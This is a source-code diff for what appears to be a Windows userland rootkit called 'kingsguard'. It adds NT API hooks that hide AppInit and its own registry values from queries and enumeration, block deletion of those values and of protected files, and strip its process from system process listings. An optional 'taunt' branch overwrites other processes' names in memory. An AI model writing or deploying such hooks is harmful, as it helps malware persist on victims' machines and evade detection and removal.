@@ -1,12 +1,38 @@
 #include "kingsguard.h"
 
+NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName)
+{
+    if (ValueName->Length > 3)
+    {
+        std::wstring w_name = std::wstring(ValueName->Buffer);
+        // std::transform(w_name.begin(), w_name.end(), ::tolower);
+        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
+            return STATUS_OBJECT_NAME_NOT_FOUND;
+    }
+
+    return OriginalNtDeleteValueKey(KeyHandle, ValueName);
+}
+
+// NTSTATUS WINAPI HookedNtSetValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueName, ULONG TitleIndex, ULONG Type, PVOID Data, ULONG DataSize)
+// {
+//     if (ValueName->Length > 3)
+//     {
+//         std::wstring w_name = std::wstring(ValueName->Buffer);
+//         // std::transform(w_name.begin(), w_name.end(), ::tolower);
+//         if (CheckExists(w_name, L"AppInit", false) || CheckExists(w_name, KEY, false)) 
+//             return STATUS_ACCESS_DENIED;
+//     }
+
+//     return OriginalNtSetValueKey(KeyHandle, ValueName, TitleIndex, Type, Data, DataSize);
+// }
+
 NTSTATUS WINAPI HookedNtOpenFile(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, ULONG ShareAccess, ULONG OpenOptions)
 {
     if (DesiredAccess & DELETE && ObjectAttributes->ObjectName->Length > 1)
     {
         std::wstring w_name = std::wstring(ObjectAttributes->ObjectName->Buffer);
         // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (w_name.find(L"Windows\\ShellComponents") != std::wstring::npos) // no delete dir
+        if (CheckExists(w_name, PATH, false))
             return STATUS_ACCESS_DENIED;
     }
 
@@ -19,7 +45,7 @@ NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE KeyHandle, PUNICODE_STRING ValueNam
     {
         std::wstring w_name = std::wstring(ValueName->Buffer);
         // std::transform(w_name.begin(), w_name.end(), ::tolower);
-        if (w_name.find(L"Appinit") != std::wstring::npos || w_name.find(L"KsGuard") != std::wstring::npos)
+        if (CheckExists(w_name, L"appinit", false) || CheckExists(w_name, KEY, false))
             return STATUS_OBJECT_NAME_NOT_FOUND;
     }
     return OriginalNtQueryValueKey(KeyHandle, ValueName, KeyValueInformationClass, KeyValueInformation, Length, ResultLength);
@@ -35,12 +61,11 @@ NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE key, ULONG index, NT_KEY_VALUE_
         {
             status = OriginalNtEnumerateValueKey(key, i, keyValueInformationClass, keyValueInformation, keyValueInformationLength, resultLength);
 
-            std::wstring name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
+            std::wstring w_name = std::wstring(KeyValueInformationGetName(keyValueInformation, keyValueInformationClass));
             // std::transform(w_name.begin(), w_name.end(), ::tolower);
-            if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
-            {
+            // if (name.find(L"AppInit") == std::wstring::npos && name.find(L"KsGuard") == std::wstring::npos)
+            if (CheckExists(w_name, L"appinit", true) && CheckExists(w_name, KEY, true))
                 newIndex++;
-            }
         }
     }
 
@@ -67,7 +92,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
         while (prev->NextEntryOffset != 0)
         {
             std::wstring w_name = std::wstring(curr->ImageName.Buffer);
-            if (w_name.find(L"KsGuard") != std::wstring::npos)
+            if (CheckExists(w_name, PROCESS, false))
             {
                 if (curr->NextEntryOffset == 0)
                     prev->NextEntryOffset = 0;
@@ -75,7 +100,7 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
                     prev->NextEntryOffset += curr->NextEntryOffset;
                 curr = prev;
             }
-            else
+            else if (TAUNT)
             {
                 WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, L"kingsguard", curr->ImageName.Length, NULL);
             }
